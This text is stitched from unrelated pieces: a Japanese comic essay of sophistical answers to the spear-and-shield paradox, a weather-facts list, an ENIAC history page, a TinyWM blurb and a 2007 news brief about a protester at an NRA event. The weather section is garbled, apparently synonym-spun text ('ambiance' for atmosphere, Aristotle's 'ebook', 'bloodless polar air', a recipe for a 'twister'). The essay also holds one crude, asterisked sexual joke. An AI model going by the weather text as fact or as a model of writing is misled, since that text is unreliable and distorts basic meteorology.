「 あなたの矛であなたの盾を突くと、どうなるのですか」
「 いいところに気がついた ！ すごいことになるんだよ、それ ！ そこが売り物なんだ、兄ちゃん。さあ、今すぐ買って試してみよう！
セットで買えばなおお得！」
高階論理
これは、あらゆる矛を止める「超盾」である。こちらは、あらゆる盾を貫く「超矛」である。 あなたは「超矛 」 で「超盾」を突くとどうなるかと尋ねているが、論理の階層が間違っている。
命題は、2階の「超盾」と1階の「矛」の関係、および、
2階の「超矛」と1階の「盾」の関係について述べたものであり、「超盾」と「超矛」の関係については定義されていない。
→ 楚の人の答え 「 未定義です 」
確率的
この矛でこの盾を突けば、2分の1の確率で通り抜ける。しかし、突いてみるまで、実際に通り抜けると断定することはできない。
したがって「この盾を貫く」と断定できるような矛は存在しない、という主張は嘘ではない。実際に確率2分の1で失敗する。 同様に「この矛で貫けない」と断定できるような盾は存在しない、という主張は嘘ではない。実際に確率2分の1で成功する。 → 楚の人の答 え 「 確率2分の1で貫通し、確率2分の1でしません」
計算量の理 論
「 この矛で貫けないものはない」と言ったが、有限時間でとは言っていない。
「この盾で防御できないものはない」と言ったが、防御が有限時間で完了するとは言っていない。
この矛でこの盾を突いた場合、結果が確定するまでの計算量は有限時間とは限らない。
結果が確定するまで「貫けなかった」とは言えないし、「防御できなかった」とも言えない。
楚の人は答えることができなかったのではなく、計算が終了していないに過ぎない。
計算に時間がかかっているからといって「答えられなかった」と断定することはできない。
解決不能であることが証明されたわけではなく、あくまで計算量が大きいだけだ。
→ 楚の人の答え 「 ご質問の答えについては、現在、計算中です」
よく分からない理 屈
この矛でこの盾を突いた場合には 「トンネル効果」が生じる。
すなわち、この盾はこの矛を完全に防御し、少しも傷つかないが、矛先は「トンネル効果」により向こう側に達する。
→ 楚の人の答え 「 トンネル効果が発生します 」
対消滅
その場合は対消滅します。盾は矛をこっぱみじんにしますので、完全に矛の攻撃を撃破したと言えます。
もっとも、そのコストとして、盾はこっぱみじんになりますから、矛の攻撃が失敗だったとは言えません。
→ 楚の人の答え 「 対消滅します 」

この矛でこの盾を突いた場合、正しく処理が完了しない可能性があります。この動作は、当社の盾と矛の仕様となっております。この問題についての詳細は、有料サポートにお問い合わせください。

商人 「 例外が発生します。 『" 0x004000C1 " の矛 が " 0x000E3860 " の盾を参照しました。盾 が" read " になることはできませんでした。矛を終了するには矛先をクリックしてください
矛をデバッグするには矛の柄をクリックしてください』」
客 「 はぁっ？ ……何ですかそれは 」
商人「 例外です 」
客 「意味が分からないんですが 」
商人 「そりゃあ例外ですから、規則の例外ですよ」
客 「そんな無責任な。困ります 」
商人 「困りますと言われて例外が発生しなくなるくらいなら、とっくに発生しなくなっていますが、なんといっても、そこはそれ、例外ですから。
こればかりは仕方ありませんねー」
楚の人の答え 「 例外が発生します 」
一喝
えーいっ、修行が足らぬ！ どちらが勝つかなどと心がぐらついているおぬしには、この最強矛と最強盾は使いこなせぬぞ！
どちらが強いか調べて、強い方に味方しようとでも言うのかっ！ たわけ！ 勝つ・負けるなどというそんな低次元の思いにとらわれている限り、
真の戦士の道は見えぬ！ 勝つのは武器ではない。 われが手にすればこの矛は 獅 （ し ） 子 （ し ） 吼 （ く ） の気合いで岩をも貫く。 われが手にすればこの盾は 裂帛 （ れっぱく ） の気合いでどんな攻撃もはねのける。 矛でも盾でもない 。 「 勝つのはそれを手にするわれ」。勝つのは常にわれ。それ以外に何もなし。おまえは既に負けている。
→ 楚の人の答え 「 考えるな、感じるんだ 」
キャンセ ル
「 あなたの矛であなたの盾を突いたらどうなるのですか 」 「 当社の矛と盾には敵味方識別装置が付属しているため、当社の矛による攻撃は矛側でキャンセルされます。
これは攻撃失敗ではなく、攻撃の中止ですから、この現象をもって貫く能力がなかったと言うことはできません。
もちろん、実際に貫けたわけではありませんから、この盾を貫けるものがないという事実には変わりありません 」 → 楚の人の答え 「 IFF によるキャンセルが発生します 」
レトリッ ク
「 わが盾の堅きこと、よく通すものなき」と言ったが、これは数学的な非存在証明ではなく、
自然科学の命題である。 すなわち、宇宙のあらゆる時間を通じての森羅万象について検証されたものではなく、
この盾に対する貫通能力を持ったものの存在が《知られていない》という意味である。
その時点において、この命題は正しかった。実際、この盾はその時点まで一度も破られたことはない。
もし貫通され、破壊されたとしたら、商品としてここに存在していないが、現に存在している。
ところで、その直後に「わが矛の利なること、物において通さざるはなき」と言ったが、この矛が貫通しないものはない、という意味である。
後者の事実の発見により、前者は否定されたが、
このようなことは科学史上、普通に起こりうることであり、
歴史的に、前者の言明の時点においては、前者は正しい理論として受け入れられていた。
あなたは、二つの主張が同時になされたという誤った仮定に基づいて反論しているが、
実際には、二つの主張は完全に同時になされたものではなく、発言の時代背景を考慮しなければならない。
→ 楚の人の答え 「貫きます。ただし盾についての主張もその時点では間違っていませんでした」
文学
あゝ 悠々 （ ゆうゆう ） たるかな 天壌 （ てんじょう ） 、 遼々 （ りょうりょう ） たるかな 古今 （ ここん ） 。 我が言葉こそ、強大な破壊主義的国家が自らを無限の正義と称しつつ、罪なき民を破壊主義者と糾弾して無差別 殺戮 （ さつりく ） をするこの世界の不条理を表すメタファ。詩の詩。怒りの怒り。わたしはしがない武器商人としてこの世界の矛盾を痛感しつつ、なおかつこの矛盾に立脚して武器を商うみずからにアンビバレンツな意識を感じずにはいられない。だからこそ、わたしの言葉は矛盾していなければならない。 人間の英知の結集が、人間を滅ぼす武器を生む。矛盾でなくて何であろう。 矛盾、それがわたしの 墓 （ ぼ ） 碑 （ ひ ） 銘 （ めい ） 。わたしは矛盾して生き、矛盾して死ぬ。 これがわたしの真実、わたしの生き様。 乞う、読者諸兄よ、 諒 ( りょう ) とせられよ。→ 楚の人の答 え 「 矛と盾のコトコト煮、おいしゅうございました 」
政治家
えー、この件につきましては、それは、今、 わたくしどもといたしましては、法律上、いうことになればですね、
矛と盾が活動している地域は非戦闘地域なんです。
両者が同一武器商人の主権に属する、楚という同じ一つの国家内の味方同士の関係ということにかんがみますれば、
これらが反目し、相互に攻撃し合う軍事的クーデター、内乱という事態は民主主義の根幹にかかわる、
憲政の常道に反する非倫理的なものでありまして、
政権に不満があれば選挙された国民の代表を通じて、話し合いで平和的に解決していくというのがわが国の
国是 ( こくぜ ) でありますから、 何でも貫ける矛を持っているじゃないか、じゃ、それで突いてみればいいと簡単に言われますが、 そのような行為は憲法上、許されていないわけです。 従いまして、そのような、あー、許されていない、不可能な、ですね、ご想定の質問に答弁を申し上げることは、差し控えさせていただきたいという、 基本的には、このような認識を持ちまして、 李 ( り ) 下 ( か ) に冠を正さず、 という心構えで 綱紀 ( こうき ) の粛正を図っていくことにやぶさかでありませんので、 国民のみなさまのご理解・ご協力をたまわりたい所存であります。 → 楚の人の答 え 「 さっそく調査し善処する 」

この盾は技術的保護手段によってプロテクトされています。
したがって、この矛でこの盾を突く行為は、個人の楽しみのためであっても、ライセンス上、禁止されています。
→ 楚の人の答え 「 違法行為の幇助となるためお答えできません」
哲学
矛が実在すると人が認識するとき対象として措定せらる矛なるものは物自体ではなくその現れに過ぎない、
取りも直さず、矛の実存はアプリオリに定まるものではなく人間が「物を突くもの」と考えることによってその物自体が後験的に一つの現れを具象化するに過ぎない、
と悟了するのは心の作用であり、人間と独立な《野生の思考》であると考えることは不可能であることは明証的である。しかるに、
盾のカドを突き刺し地面にくぼみを作ることもできるのだから、人間が盾とか矛とか呼んでいるものは、アポステリオリの、経験に基づく、
真の先験的判断ではない、普遍妥当性に欠ける、迷妄である。盾はまた矛であり、矛はまた盾である。盾はまた杯であり、矛はまた逆さに持てば孫の手である。
このように物自体とその現れの関係は一定しないのであるから、これらを対象として一定の仕方で措定するという行為によっては、
普遍妥当性のある帰結をたとえ弁証法的にでも帰納し得ると仮定することは許されない、
取りも直さず矛は盾を突く「べき」であり盾は矛を防ぐ「べき」である、この盾はあらゆる攻撃を防がざるべからざる、
この矛はあらゆる物を貫通せざるべからざる、という広義の倫理的要請に他ならず、
道徳律の本性として、そこに科学的な「である」の帰謬法が成立しうべきであると思惟すること自体が、実存に対する背信である。
→ 楚の人の答え 「貫く『べき』だが貫く『のである』とは言えない。それが哲学というものだ」
宗教
シャーリプトラよ。 この世界で移り変わる現象というものには、実体がない。 現象とは空なのだ。 貫くということはなく、貫かないということはない。防ぎ止めるということはなく、防ぎ止めないということはない。 すべてが空であると知った修道者は、商人の誇大広告に惑わされることもなく、惑わされないこともない。 それを批判することもなく、批判しないこともない。 執着を離れ、心を離れた修道者は、永遠の安らぎに入る。 → 楚の人の答 え 「 ただの誇大広告ですが何か？ 」
宗 教2
まことに、まことに、あなたがたに告げます。
矛を持った敵が怒りながら近づいて来たとき、盾を構えてはいけない。
盾で身を守ろうとすれば、敵はますます怒りを募らせ、あなたを激しく攻め立てるだろう。
矛を突きつけ金を出せと脅す相手には、金だけでなく持っているものすべてを与えなさい。あなたは何も失わないからである。
矛を突きつけ謝れと要求する相手には、心から謝罪しなさい。あなたは何も失わないからである。
武器を振りかざし「そんなきれいごとが通用するか」とあざ笑う相手をさげすんではいけない。あなたには失うものなど何もない。
「これは自衛のための戦いだ。やらなければこっちがやられる」などと言い訳をするな。 かえって「それほど激しい憎悪を買うからには、わたしにも非があるのだろう」とかえりみなさい。
殺し合ってはいけない。二人が死ぬより一人が死ぬ方が良いからである。
憎しみが憎しみを生み、殺しに殺しで報いるなら、蛮行は永遠になくならない。
どちらかが譲歩しなければならないのなら、あなたが譲りなさい。あなたは何も失わない。
子孫が永遠の殺し合いをするくらいなら、平和を祈りながらあなたひとりが貫かれる方がましである。
実に天の王国は、あなたのためにある。 狭い門から入りなさい。 → 楚の人の答え 「立ち去れ、サタン。『神を試してはならない』と書いてある」
宗教3
アリフ、ラーム、ミーム。 真のたたかいは争いではなく克服。なのに不信者どもは言っている。「矛が勝つか盾が勝つかのいずれかで、どちらかが間違っていて、どちらかが正しい。我々が正しいのだ、やつらが間違っているのだ」と。 言ってやるがよい。 「 いや、いや、神様は人知を超えたもの。両方とも勝つことは可能だし、両方とも勝たぬ限り、両方とも滅んでしまうのだぞ」と。
そのときになって悔やんでも、もはや手遅れ。
目を開いて見るがよい。お前たちが肥満で悩んでいる同じとき、こちらでは大量の人々が飢えて死んでいくではないか。考えるのをやめて安楽を追求しているが、自分たちが住む世界を壊してしまったらどこに安楽があるというのか。
「最後の審判などおとぎ話。神の裁きなどあるわけがない」と言っているが、なぜ気付こうとしない。今まさにこの瞬間、お前たちは試されているのだぞと。
→ 楚の人の答え 「 矛と盾は例え話。 共栄か滅亡か。 生態系は一つ。地球は一つ。おーガッチャマン 」
法律
確かに主張には不整合が見られ、 虚偽の効能をうたった詐欺的商法に該当する可能性を直ちには否定できないが、
非破壊的試験では、このことを証明できない。
すなわち、盾の効能が事実であれば矛は損壊する可能性があり、
矛の効能が事実であれば盾は損壊する可能性がある。
「或る人」が実際に購入したならまだしも、所有権を持たず、自己の支配下にあるわけでもない商品について、
たとえ詐欺的商法の疑いがあるとしても、かかる破壊的行動を強要し、あるいは破壊的実験によってのみ初めて確答できるような質問への回答を強要することは、正当な法手続とは認められない。
なお 「 信州一 」 「 最高級 」 「 元気百倍 」 「 千枚通し 」 「万能鍋」といった宣伝文句等は、厳密には証明されず、あるいは証明されない蓋然性がある場合においても、一種の強調表現として公正な商慣習の範囲内と認められるべきものであろう。
けだし、路上で販売する商人がこの程度の誇張的宣伝を行ったとしても、
それをとがめることは社会通念になじまないからである。
すなわち、商人は自然言語を用いて商売を行うのであるから、商品について、
冗談を述べたりごくわずかでも厳密に証明できないことを言ってはならないとまで解釈することは合理的でないのであって、わずかな言葉尻をとらえて買い手が売り手を糾弾できると考えることは、取引の安全の観点からも、売り手と買い手の関係のバランスからも、不適切である。取引においては、売り手（その者をして販売を行わせる者も含む。以下同じ。）において不正があってはならないことは格別、
社会通念上、買い手にも一定の注意が要求される。
一体売り手の言動が詐欺的であると認定されるには、
( 1 ) 騙そうとする悪意があり、かつ、 ( 2 ) 現実に騙そうとしている —
すなわち（イ）通常人の注意をもって看破できない、ないし、（ロ）その特定の顧客の特性に鑑みてその顧客が欺かれる可能性があると推定できる合理的な根拠が存在している — 必要があると解するのが相当である。 商品に関する売り手の言葉は、たとえ厳密には事実でない可能性があっても、右要件を満たさない限り、原則として許容範囲であると評価できる。
本件においては、その宣伝文句のオーバーさは極端であり、
非現実なまでに極端であるが故事実と紛らわしいような欺罔的なものではなく、
通常人の注意をもってすれば科学的に証明されるような厳密な事実ではなく単なる言葉のあやであることを容易に了解できるのであるから、右範疇に属さしめるのが適当である。
結局、法律上、疑わしきは罰せずの原則が適用され、
「 楚の人」は無罪の推定を受けるし、 通念上も可罰的とは言えないので、「楚の人」に対する糾弾は理由がない。
一方、法律上無実であり、倫理的にも問題がない「楚の人」を矛盾していると一方的に指摘し、
自著で公刊し、子々孫々の代まで語られる故事熟語を発生させた韓非子は、
「楚の人」の名誉を不当にかつ著しく損なっているものであり、
営業妨害、および名誉毀損のそしりを免れない。
→楚の人の答え 「 表現の自由です 」
死の商人
諸君、わたしは戦争が好きだ。わたしは戦争が好きだ。わたしは戦争が大好きだ。矛で突くのが好きだ。矛で突かれるのが好きだ。
盾で防ぐのが好きだ。盾で防がれるのが好きだ。うんぬん…→楚の人の答え「
フッフッフッ、わたしは武器商人。 …どちらが勝つかなんて、ちっぽけなことだ。愚かな人間どもがこれで殺し合いをしてくれれば、それでいいのですよ。 次の戦争のために！ 次の次の戦争のために…！」
数学（公理論的 ）
この矛でこの盾を突くことはできない。
証明 : 背理法による。突くことができたと仮定すると、公理により、矛は盾を貫かねばならず、同時に貫くことはできない。これは矛盾である。 ゆえに「突くことができる」という仮定は誤っている。これが証明したいことであった。→楚の人の答え「突くことはできません」
数学（正統的論理学 ）
矛盾は発生していない。
命題の少なくとも一方は偽である。すなわち少なくとも次のいずれか一方が成り立つ。
( a) 「 この盾で任意の武器を防御することはできない 」 言い換えれば「この盾を破壊する武器は存在する」。
( b ) 「 この矛では任意の防御を突破できない」。すなわち「この矛では突破できない防壁は存在する」。
直観的にも明らかだ。 「偽」である命題を両方「真」であると仮定したために矛盾が発生したに過ぎず、
韓非子の仮定は誤っている。この件は「矛盾」ではなく「偽」に過ぎない。どこにもパラドックスは存在していない。
→楚の人の答え「たかだか命題の少なくとも一方が偽であることが検証されるだけです」
番外編
以下は言葉自体の「ロジック」ではなく、言葉を使う相手（人間）を目標とするもの。 比較のために例示する。
相手の人格を直接・間接に攻撃したり、プライドを刺激したり、
心理的動揺を誘ったり、関係ない話とセットにすることも、現実の論争においては有効であるかもしれない。
しかし、現実の論争で有効かどうかという実用性は、「へりくつ」の論理それ自体を楽しもうというこのメモのテーマとはまた別の話となる。
その意味で、以下は「一見似ているようだが悪い例」といえる。
ここまで書いてきた 「ロジックだけ」の透明さ（美しいかどうかは主観だが、ともかくロジックの「感触」）と、
以下で例示する「議論そのものではなく、議論する人間を巻き込む」ことの濁った感じの違いを感じていただければと思う。
逆ギレ（質問する行為自体を責める）
「 あなたの矛であなたの盾を突くと、どうなるのですか」
「 教えてクンきたーーーーー。質問する前に検索くらいしろよ、ﾊﾞｶ」
おげれつ（似ているようだが無関係のモデル上の議論にすり替える）
客 「あなたの矛であなたの盾を突くと、どうなるのですか」
商人 「 もしこういう話があったらどうよ………… 」
楚の国にち××とま××をひさぐアンドロギュノスがいた。その言うことには、
「 わたしのち××のどん欲さときたら、どんなすごいま××でも飽き足らないのである」
「 わたしのま××のすごさときたら、どんなち××でも満足しないものはないのである」
そこである人 が
「 あなたのち××であなたのま××を突くとどうなるのですか」
商人 「もしあなたがそのアンドロギュノスだったらどうなるね。その立場になって考えてみ」
客 「え…ぶっちゃけ、無理な体位だと 」
商人 「できたらおもしろいけど、できないんだよ。な。 それと同じで、オレの矛でオレの盾は突けないだろ、両方オレのなんだから。
右手で矛、左手で盾を持っているところを想像してみ。
常識で分かるっしょ。分かったらクソして寝ろ」
付記
あくまでネタですから、 「 トンネル効果とは 」 「 推定無罪とは」、といったまじめなつっこみは勘弁してください。
このメモを書いたきっかけは、あるウェブページを読んだことです。
そこでも、同じように「矛盾」の故事についての詭弁が紹介されていました。
何かの本の内容のようでした。 テーマに魅力を感じましたが、肝心の詭弁があまりおもしろいとは思えませんでした。
（最近の紙メディアは本当に低迷しているようです…。）
そこで、同じ題で、自分好みのへりくつをいくつか書いてみました。
以下、参考までに … 。
最初の 「 高階論理」は、 「 この矛 」 「 この盾」自身を「何でも」というクラスに属する対象と認めないもので、
集合論のパラドックス（ラッセルのパラドックス）を回避するのに用いられた古典的手法。
また、最後の「数学」は、そもそもこれはパラドックスではなく単なる偽だ、という話。
言ってしまうと身もふたもないのですが、実はこの話は矛盾じゃなくて単なる偽なんですよね、数学的には。
いろいろ言葉で遊んできたけど実はそもそも矛盾じゃなかったというオチ。
「 計算量の理論」では、 「 答えることができない」ことを証明することは実際には非常に難しい、
という点をついている。 韓非子は 「楚の人は答えることができなかった」と言っているが、
二三分黙り込んでしまったとしても、解決不能であることが証明されたわけではない。
五分後に答えるかもしれないし、一万年後に答えるかもしれない。
「 答えることができた」は答えた瞬間に確定し、
「 答えない」は答えないと宣言すれば確定するが、
「答えることができない」を証明することは難しい。
計算可能性とか、決定可能性とか、チューリングマシンの停止問題。
「答えることができなかった」という韓非子も、実はそこで論理が破綻している。
韓非子が言っていることは論理でなくて、数分たっても答えないから答えられないのだろう、という人間の経験にすぎない。
「 確率的」も、計算量の理論系で、確定的か確率的かという区別で（つまり排中律をやめて「真 」「たぶん真 」 「たぶん偽 」 「偽」みたいに言うことで）ごまかしている。
おもしろいけれど単なる詭弁。 結果が確定的でないと言っておいて、だから確定的にこうだと言えることはない、とごまかす。
賢い客だったら「では確定的という意味では矛も盾も不完全ですね」と言い返して、両方偽だと言うだろう。
本質的には2命題は「たぶん偽」でどちらも「完全に偽」とは言えない、というところで、ごまかしを入れて、
「 偽ではない」ゆえにどちらも「真」と言っている。同じ理屈で「たぶん偽」ゆえに「真ではない」ゆえにどちらも「偽」とされてしまう。
この論法の間違いは、自分に都合がいいところだけ排中律を仮定し、そうでないと排中律を否定していることです。
「 トンネル効果 」 「対消滅」は、逆に言っていることが単純に真実だとして、物理的にどう解釈できるかという話。
あとは見ての通り冗談です。

Climate Takes Place Inside the Troposphere Climate details inform us that the troposphere is the bottom layer of the Earth ’s ambiance .
The troposphere is the place the magic of climate happens .
The troposphere makes up 75 % of the Earth ’s ambiance .
It holds many of the environment ’s water vapor , too – 99 % to be exact .
Whilst we might imagine of the ambiance as being uniform across the globe , it ’s , in reality , thicker over the tropics , and thinner close to the Arctic .
Climate Is Attributable to Air Stress , Temperature and Moisture Variations
At its most primary , the climate is brought on by variations in air stress , temperature and moisture .
Several types of climate phenomena are created when these elements are combined collectively in diverse proportions .
For instance , to make a twister , combine some bloodless polar air at an excessive altitude with some warm , heat tropical air at low altitudes !
There Are Three Methods to Make Rain
There are three distinct methods to create rain or snow on Earth : frontally , orographically , and convectively .
Frontal rain takes place when two lots of air meet .
Orographic rain happens when the form of the land causes clouds to kind .
Convective clouds create convective rain .
These clouds type as a result of instability within the environment .

13 Diverse Varieties of Storms Have an Effect on Earth
It could appear fairly apt , on condition that it ’s broadly viewed an unfortunate quantity , however , there are 13 various kinds of storm right here on Earth .
A number of these storms can solely take place in specific areas due to the geography and local weather of these areas .
Climate details inform us that tornadoes , windstorms , dirt devils , squalls and gales are primarily acknowledged by their wind patterns .
Hailstorms , ice storms , snowstorms , blizzards , ocean storms , thunderstorms and tropical cyclones are acknowledged by the precipitation they create .
You can know tropical cyclones higher by one among their different names , relying on the place inside the world you stay : typhoons , hurricanes , tropical depressions or tropical storms .
Meteorology
Is the Research of the Ambiance Meteorology is the title for the scientific examination of the ambiance and consists of the climate forecasting we hear on the information or see on our smartphones each day .
It ’s an interdisciplinary subject that helps to clarify climate phenomena .
Aristotle
Is the Father of Meteorology Aristotle was n’t simply a superb thinker ; he ’s additionally credited as being the founding father of meteorology .
In 350 BC , Aristotle penned an ebook he referred to as Meteorology .
Inside its covers , he detailed a procedure that meteorologists have since termed the hydrologic cycle .
He did all of this without using the flowery computer systems which might be now infamous use inside the self - discipline .
The Upanishads Dip into The Research of the Climate Centuries earlier than Aristotle wrote his famed ebook , the Indian Upanishads featured the outline of a particular meteorological occasion – the formation of clouds .
These lovely verses additionally contemplated the local weather and the seasonal cycles brought on by the Earth ’s orbit .
Nobody is pretty positive when the Upanishads had been written , however they may be believed to be around 2,500 years previous .
Christopher Columbus Skilled a Cyclone in 1494 Climate details point out that whilst on one in each of his several missions , Christopher Columbus skilled a tropical cyclone .
His notes had been the primary written account of this kind of storm by a European .
A Medici Established the First Climate Community A member of the traditionally well - known Medici household , Ferdinando II de Medici , created the world ’s first regarded climate observing community .
With stations in Warsaw , Florence , Bologna , Milan , Paris and different cities , this community collected meteorological information and despatched it to Florence frequently .

The UK Had the World ’s First Climate Service Robert Fitzroy , famed captain of the HMS Beagle , was appointed the primary Meteorological Statist to the Board of Commerce within the United Kingdom , which later grew to become the UK Meteorological Workplace .
Climate details inform us that the previous captain ran the primary meteorological service inside the world and started out the , in the end , the widespread custom of printing climate forecasts in newspapers in 1860 .
Generally Snow Is Pink
You would possibly be amazed if it snows within the alpine areas of Colorado or in California ’s Sierra Nevada Mountains … generally , pink snow is noticed !
In accordance with climate details , the phenomenon is attributable to algae referred to as chlamydomonas nivalis .
This reddish - tinged algae solely lives in bloodless climates and may generally flip a winter wonderland a fetching shade of pink .
Be Blown Away at 231 Miles Per Hour
In April 1934 , a storm in Mount Washington , New Hampshire , reared its ugly head with a wind gust measuring an amazing 231 miles per hour .
It was the quickest floor wind velocity noticed by a human .
Over an Inch of Rain Fell in One Minute in Maryland in 1956
The foremost rainfall ever recorded inside the house of a minute occurred in Unionville Maryland , on April 7 , 1956 .
On that day , 1.23 inches of rain fell from the sky in only 60 seconds .
Over 50 years later , it ’s nonetheless the very best recorded rainfall in a single minute .
530,000 Have Died Due to Climate from 1994 - 2013
Non-authorities institution Germanwatch reported that severe climate has killed extra than 530,000 individuals between 1994 and 2013 .
In that point body , the climate is believed to have priced the world over $ 2 trillion in economic losses .
South Dakota Is Domestic to the Largest Hailstone
The most important recorded hailstone measured eight inches and weighed nearly two kilos .
It fell on July 23 , 2010 , in Vivian , South Dakota .
The US ’ Countrywide Climate Service verified the stone ’s measurement and weight .

Programming the ENIAC
Two early programmers ( Gloria Ruth Gordon [ Bolotsky ] and Esther Gerston ) at work on the ENIAC .
US Army photo from the archives of the ARL Library ( US Army Research Laboratory ) .
Built in 1943 - 45 at the Moore School of the University of Pennsylvania for the War effort by John Mauchly and J. Presper Eckert ( no relation to Columbia University 's Wallace Eckert ) but not delivered to the Army until just after the end of the war , the Electronic Numerical Integrator And Computer ( ENIAC ) was the first general - purpose electronic digital computer .
It was 150 feet wide with 20 banks of flashing lights and about 300 times faster than the Mark 1 at addition .
Wallace Eckert is cited in some of the histories as an influence on the designers , as he was for the Mark 1 .
Annals of the History of Computing
Archaeology of Computers — Reminiscences , 1945 - 47
The ENIAC was not a stored - program computer ; it is " better described as a collection of electronic adding machines and other arithmetic units , which were originally controlled by a web of large electrical cables " ( David Alan Grier , IEEE , Jul - Sep 2004 , p.2 ) .
It was programmed by a combination of plugboard wiring ( shown at the top ) and three " portable function tables " , shown at left ( CLICK HERE and HERE for better views ) .
Each function table has 1200 ten - way switches , used for entering tables of numbers .
Note the IBM punches on the far right — a bit hard to make out ; better visible in this clearer but less atmospheric copy of the same photo .
Franz
Alt writes in , Communications of the ACM , July 1972 :
One of the peculiarities that distinguished ENIAC from all later computers was the way in which instructions were set up on the machine .
It was similar to the plugboards of small punched - card machines , but here we had about 40 plugboards , each several feet in size .
A number of wires had to be plugged for each single instruction of a problem , thousands of them each time a problem was to begin a run ; and this took several days to do and many more days to check out .
When that was finally accomplished , we would run the problem as long as possible , i.e. as long as we had input data , before changing over to another problem .
Typically , changeovers occurred only once every few weeks .
Later , ENIAC 's plugboards were permanently " microprogrammed " with a repertoire of 50 - 100 commonly used instructions that could be referenced from a " user program " entered as a sequence of instructions into the function - table switches . [ 40 ]
Herb Grosch says of this page [ personal correspondence , 10 May 2003 ] :
I was roaming around the links and sublinks in the ENIAC story , and note with much interest that there were three or four castered twiddle boards [ portable function tables A , B , and C ] , where I had always assumed only one .
I note the almost complete absence of Col. [ then Major ] Simon , and of Dick Clippinger , who should share with von Neumann the credit for moving from plugging to twiddling for program insertion .
I was pleased to see short reference to the IBM I/O units , which show in your and other copies of the most famous photo .
I wonder if John McPherson knows how they were sold / rented / given to the Moore School — never thought to ask him at the time .
Unusual .
Bashe [ 4 ] says , " When the Army requested special card reading and punching units for an undisclosed project underway at the University of Pennsylvania , [ IBM Chief Engineer James W. ]
Bryce and his staff coordinated IBM 's response ...
In 1946 , the instrument produced by the project was revealed as ENIAC ... "
Not on your page , but in the Richie story and other Aberdeeneries there should have [ been made ] mention of the astronomer who taught them how to calculate trajectories by hand : Forest Ray Moulton , circa 1920 [ my page 89 ] .
That prolly was n't intentional , but the elision of all references to the big punched card shop Cunningham ran , and to the two relay machines IBM built , certainly was .
Those are what actually did firing tables , after desk calculators were overwhelmed and until the Bell machine arrived , and until ENIAC was moved in and later freed up .
Now , about the " I 'm dubious ... " above .
I do n't think Wallace Eckert had any influence whatsoever on the designers of the ENIAC or the ASCC .
Certainly in the hundreds and hundreds of hours he and I talked about those two machines , he never mentioned such , nor did Frank Hamilton , who was Number Two on the ASCC , ever hint at the latter .
A 1938 meeting between ASCC's Howard Aiken and Wallace Eckert is well known [ 9 ] .
Gutzwiller [ 90 ] says that Presper Eckert ( among other well - known pioneers of computing including Aiken and Vannevar Bush ) got his first inspiration from Wallace Eckert 's 1940 " orange book " .
I have not been able to pin down any evidence of direct contact between the two Eckerts .
Since ENIAC was a war project it would not be surprising that records are not available .
Born on a farm in Missouri , the sixth of seven children , Jean Jennings Bartik always went in search of adventure .
Bartik majored in mathematics at Northwest Missouri State Teachers College ( now Northwest Missouri State University ) .
During her college years , WWII broke out , and in 1945 , at age 20 , Bartik answered the government 's call for women math majors to join a project in Philadelphia calculating ballistics firing tables for the new guns developed for the war effort .
A new employee of the Army 's Ballistics Research Labs , she joined over 80 women calculating ballistics trajectories ( differential calculus equations ) by hand - her title : “ Computer . ” Later in 1945 , the Army circulated a call for " computers " for a new job with a secret machine .
Bartik jumped at the chance and was hired as one of the original six programmers of ENIAC , the first all - electronic , programmable computer .
She joined Frances “ Betty ” Snyder Holberton , Kathleen McNulty Mauchly Antonelli , Marlyn Wescoff Meltzer , Ruth Lichterman Teitelbaum and Frances Bilas Spence in this unknown journey .
With ENIAC 's 40 panels still under construction , and its 18,000 vacuum tube technology uncertain , the engineers had no time for programming manuals or classes .
Bartik and the other women taught themselves ENIAC 's operation from its logical and electrical block diagrams , and then figured out how to program it .
They created their own flow charts , programming sheets , wrote the program and placed it on the ENIAC using a challenging physical interface , which had hundreds of wires and 3,000 switches .
It was an unforgettable , wonderful experience .
On February 15 , 1946 , the Army revealed the existence of ENIAC to the public .
In a special ceremony , the Army introduced ENIAC and its hardware inventors Dr. John Mauchly and J. Presper Eckert .
The presentation featured its trajectory ballistics program , operating at a speed thousands of time faster than any prior calculations .
The ENIAC women 's program worked perfectly - and conveyed the immense calculating power of ENIAC and its ability to tackle the millennium problems that had previously taken a man 100 years to do .
It calculated the trajectory of a shell that took 30 seconds to trace it .
But , it took ENIAC only 20 seconds to calculate it - faster than a speeding bullet !
Indeed !
The Army never introduced the ENIAC women .
No one gave them any credit or discussed their critical part in the event that day .
Their faces , but not their names , became part of the beautiful press pictures of the ENIAC .
For forty years , their roles and their pioneering work were forgotten and their story lost to history .
The ENIAC Women 's story was discovered by Kathy Kleiman in 1985 .
Bartik will discuss what it means to be overlooked , despite unique and pioneering work , and what it means to be discovered again .
( Jean Jennings died in 2011 . )

TinyWM is a tiny window manager that I created as an exercise in minimalism .
It is also maybe helpful in learning some of the very basics of creating a window manager .
It is only around 50 lines of C .
There is also a Python version using python - xlib .
It lets you do four basic things :
Move windows interactively with Alt + Button1 drag ( left mouse button ) Resize windows interactively with Alt + Button3 drag ( right mouse button )
Raise windows with Alt+F1 ( not high on usability I know , but I needed a keybinding in there somewhere )
Focus windows with the mouse pointer ( X does this on its own )

Report : NRA audience called for female protester to be Tased RAW STORY
Published : Monday September 24 , 2007
Print This Email This Despite the uproar that ensued after a questioner was shocked following a forum Sen. John Kerry ( D - MA ) held in Florida , not everyone is unhappy with the Taser .
At the National Rifle Association 's " Celebration of American values " conference Friday , as Sen. John Thune ( R - SD ) delivered his opening remarks , a protester stood up and began yelling , according to a 183 - word brief by Ben Pershing in Monday 's Roll Call .
The audience responded .
" As she bellowed , a source who was present told [ the paper ] , ' All these old dudes started shouting ,  Tase her !
Tase her !'
" Alas , security personnel just quietly walked the offender out the door , sans the 50,000 volts of electricity and  as NRA members might appreciate  ' more stopping power than a .357 Magnum ' that Taser claims to provide , " Pershing wrote .
" Maybe next time . "
A report on the protester in an MSNBC blog made no mention of any ' Tase cheers . '
NBC 's Lauren Appelbaum wrote , " At the NRA conference , while GOP Sen .
John
Thune was speaking , a woman rushed into the ballroom holding a sign that said ' honk for peace ' on one side and showed a picture of dead children on the other side .
She yelled ' Do n't Iraq Iran ' and addressed the senator directly .
' Please senator , do n't Iraq Iran .
Stop killing the children .
You are all accomplices to war crimes .
I will not stand any more bloodshed . '
A NRA member yelled at security , repeatedly saying ' How the hell did she get in here ?
Get her out of here . ' "
According to MSNBC , afterward ,
Thune defended the woman 's right to protest .
" Thune , after the woman was forcefully removed , talked about rights and said basic rights included her right to speak her mind .
Then he went on with his speech , " Appelbaum wrote for MSNBC's First Read .

